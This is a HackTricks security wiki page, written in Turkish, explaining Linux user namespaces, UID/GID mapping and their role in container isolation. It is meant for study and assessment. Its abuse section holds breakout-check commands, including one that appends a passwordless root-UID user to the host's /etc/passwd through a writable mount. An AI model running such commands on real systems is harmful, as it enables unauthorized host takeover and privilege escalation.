# User Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Overview

User namespace, kernel'in namespace içinde görülen user ve group ID'lerini namespace dışında farklı ID'lere eşlemesine izin vererek bu ID'lerin anlamını değiştirir. Bu, modern container protection'larının en önemlilerinden biridir; çünkü classic container'lardaki en büyük tarihsel sorunu doğrudan ele alır: **container içindeki root, host üzerindeki root'a rahatsız edici derecede yakındı**.

User namespace'leri sayesinde bir process container içinde UID 0 olarak çalışabilir ve yine de host üzerinde unprivileged bir UID aralığına karşılık gelebilir. Bu, process'in container içindeki birçok görev için root gibi davranabilmesini sağlarken host açısından çok daha az yetkili olmasını sağlar. Bu, her container security sorununu çözmez; ancak bir container compromise'ın sonuçlarını önemli ölçüde değiştirir.

## Operation

Bir user namespace, namespace ID'lerinin parent ID'lerine nasıl çevrildiğini açıklayan `/proc/self/uid_map` ve `/proc/self/gid_map` gibi mapping file'lara sahiptir. Namespace içindeki root, host üzerinde unprivileged bir UID'ye map ediliyorsa gerçek host root gerektirecek operations aynı yetkiyi taşımaz. User namespace'lerin **rootless containers** için merkezi olmasının ve eski rootful container default'ları ile daha modern least-privilege design'lar arasındaki en büyük farklardan biri olmasının nedeni budur.

Buradaki nokta ince ancak kritiktir: container içindeki root ortadan kaldırılmaz, **translated** edilir. Process yerel olarak root benzeri bir environment deneyimlemeye devam eder; ancak host, onu full root olarak değerlendirmemelidir.

## Lab

Manual bir test şudur:
```bash
unshare --user --map-root-user --fork bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
```
Bu, mevcut kullanıcının namespace içinde root olarak görünmesini sağlarken dışında host root olmamasını sağlar. User namespace'lerin neden bu kadar değerli olduğunu anlamak için en iyi basit demolarından biridir.

Container'larda görünür mapping'i şu şekilde karşılaştırabilirsiniz:
```bash
docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map'
```
Kesin çıktı, engine'in user namespace remapping veya daha geleneksel bir rootful yapılandırma kullanıp kullanmadığına bağlıdır.

Mapping'i host tarafından şu şekilde de okuyabilirsiniz:
```bash
cat /proc/<pid>/uid_map
cat /proc/<pid>/gid_map
```
## Runtime Kullanımı

Rootless Podman, user namespace'lerin birinci sınıf bir security mechanism olarak ele alınmasının en açık örneklerinden biridir. Rootless Docker da bunlara bağlıdır. Docker'ın userns-remap desteği, rootful daemon deployments ortamlarında da güvenliği artırır; ancak geçmişte birçok deployment, compatibility nedenleriyle bunu devre dışı bırakıyordu. Kubernetes'in user namespace desteği gelişmiştir, ancak adoption ve varsayılanlar runtime'a, distro'ya ve cluster policy'ye göre değişir. Incus/LXC sistemleri de UID/GID shifting ve idmapping fikirlerine büyük ölçüde dayanır.

Genel eğilim açıktır: user namespace'leri ciddi şekilde kullanan ortamlar, container root'un gerçekte ne anlama geldiği sorusuna, bunları kullanmayan ortamlardan genellikle daha iyi bir yanıt verir.

## Gelişmiş Mapping Ayrıntıları

Unprivileged bir process `uid_map` veya `gid_map` dosyasına yazdığında kernel, privileged parent namespace writer için uyguladığından daha sıkı kurallar uygular. Yalnızca sınırlı mapping'lere izin verilir ve `gid_map` için writer'ın genellikle önce `setgroups(2)` özelliğini devre dışı bırakması gerekir:
```bash
cat /proc/self/setgroups
echo deny > /proc/self/setgroups
```
Bu ayrıntı önemlidir; çünkü user-namespace kurulumunun rootless deneylerde bazen neden başarısız olduğunu ve runtime'ların UID/GID delegation çevresinde neden dikkatli helper logic gerektirdiğini açıklar.

Bir diğer gelişmiş özellik **ID-mapped mount**'tur. Disk üzerindeki sahipliği değiştirmek yerine ID-mapped mount, bir mount'a user-namespace mapping uygular; böylece sahiplik, o mount görünümü üzerinden çevrilmiş olarak görünür. Bu özellik, özellikle rootless ve modern runtime kurulumlarıyla ilgilidir; çünkü paylaşılan host path'lerinin recursive `chown` işlemleri olmadan kullanılmasına olanak tanır. Security açısından bu özellik, temel filesystem metadata'sını yeniden yazmasa bile bir bind mount'un namespace içinden ne kadar writable göründüğünü değiştirir.

Son olarak, bir process yeni bir user namespace oluşturduğunda veya bu namespace'e girdiğinde, **o namespace içinde** tam bir capability set'i aldığını unutmayın. Bu, bir anda host-global power kazandığı anlamına gelmez. Bu capabilities'in yalnızca namespace modeli ve diğer protections izin verdiği yerlerde kullanılabileceği anlamına gelir. `unshare -U` komutunun, host root boundary'sini doğrudan ortadan kaldırmadan mounting veya namespace-local privileged operations yapılabilmesini bir anda mümkün kılmasının nedeni budur.

## Yanlış yapılandırmalar

En büyük weakness, uygulanabilir oldukları ortamlarda user namespaces kullanmamaktır. Container root'u host root'a çok doğrudan map edilirse writable host mounts ve privileged kernel operations çok daha tehlikeli hale gelir. Bir diğer problem, trust boundary'yi ne kadar değiştirdiğini fark etmeden compatibility için host user namespace sharing'i zorlamak veya remapping'i devre dışı bırakmaktır.

User namespaces, modelin geri kalanıyla birlikte değerlendirilmelidir. Aktif olsalar bile broad runtime API exposure veya çok weak bir runtime configuration, diğer path'ler üzerinden privilege escalation'a hâlâ izin verebilir. Ancak bunlar olmadan birçok eski breakout class'ını exploit etmek çok daha kolay hale gelir.

## Kötüye kullanım

Container, user namespace separation olmadan rootful ise writable host bind mount çok daha tehlikeli hale gelir; çünkü process gerçekten host root olarak yazıyor olabilir. Dangerous capabilities de aynı şekilde daha anlamlı hale gelir. Attacker'ın translation boundary'ye karşı eskisi kadar mücadele etmesi gerekmez; çünkü translation boundary neredeyse hiç yoktur.

Bir container breakout path'i değerlendirilirken user namespace'in mevcut olup olmadığı veya bulunmadığı erken aşamada kontrol edilmelidir. Bu, her soruyu yanıtlamaz; ancak "container içindeki root"un host açısından doğrudan bir anlam taşıyıp taşımadığını hemen gösterir.

En pratik abuse pattern'i mapping'i doğrulamak ve ardından host-mounted content'in host-relevant privileges ile writable olup olmadığını hemen test etmektir:
```bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
touch /host/tmp/userns_test 2>/dev/null && echo "host write works"
ls -ln /host/tmp/userns_test 2>/dev/null
```
Dosya gerçek host root'u olarak oluşturulursa, user namespace izolasyonu bu path için fiilen ortadan kalkar. Bu noktada klasik host-file abuse'ları gerçekçi hâle gelir:
```bash
echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"
cat /host/etc/passwd | tail
```
Canlı bir değerlendirmede daha güvenli bir doğrulama için kritik dosyaları değiştirmek yerine zararsız bir işaretleyici yazın:
```bash
echo test > /host/root/userns_marker 2>/dev/null
ls -l /host/root/userns_marker 2>/dev/null
```
Bu kontroller önemlidir; çünkü asıl soruya hızlıca yanıt verirler: Bu container içindeki root, writable bir host mount'ının doğrudan host compromise yoluna dönüşeceği kadar host root'a yakın bir şekilde mi eşleniyor?

### Tam Örnek: Namespace-Local Capabilities'i Geri Kazanma

seccomp `unshare` işlemine izin veriyorsa ve ortam yeni bir user namespace oluşturulmasına olanak tanıyorsa, process bu yeni namespace içinde tam bir capability setini yeniden kazanabilir:
```bash
unshare -UrmCpf bash
grep CapEff /proc/self/status
mount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works"
```
Bu, tek başına bir host escape değildir. Önemli olmasının nedeni, user namespace'lerin daha sonra zayıf mount'lar, vulnerable kernel'ler veya kötü şekilde dışa açılmış runtime yüzeyleriyle birleşen, ayrıcalıklı namespace-local işlemleri yeniden etkinleştirebilmesidir.

## Kontroller

Bu komutlar, bu sayfadaki en önemli soruyu yanıtlamayı amaçlar: Bu container içindeki root, host üzerinde hangi kullanıcıya eşleniyor?
```bash
readlink /proc/self/ns/user   # User namespace identifier
id                            # Current UID/GID as seen inside the container
cat /proc/self/uid_map        # UID translation to parent namespace
cat /proc/self/gid_map        # GID translation to parent namespace
cat /proc/self/setgroups 2>/dev/null   # GID-mapping restrictions for unprivileged writers
```
Burada ilginç olanlar:

- Süreç UID 0 ise ve maps doğrudan veya host-root'a çok yakın bir eşleme gösteriyorsa container çok daha tehlikelidir.
- root ayrıcalıksız bir host aralığına eşleniyorsa bu çok daha güvenli bir temel oluşturur ve genellikle gerçek user namespace izolasyonuna işaret eder.
- Eşleme dosyaları tek başına `id` komutundan daha değerlidir; çünkü `id` yalnızca namespace içindeki kimliği gösterir.

Workload UID 0 olarak çalışıyorsa ve eşleme bunun host root'a yakın bir karşılığa sahip olduğunu gösteriyorsa, container'ın geri kalan ayrıcalıklarını çok daha katı biçimde değerlendirmelisiniz.
{{#include ../../../../../banners/hacktricks-training.md}}
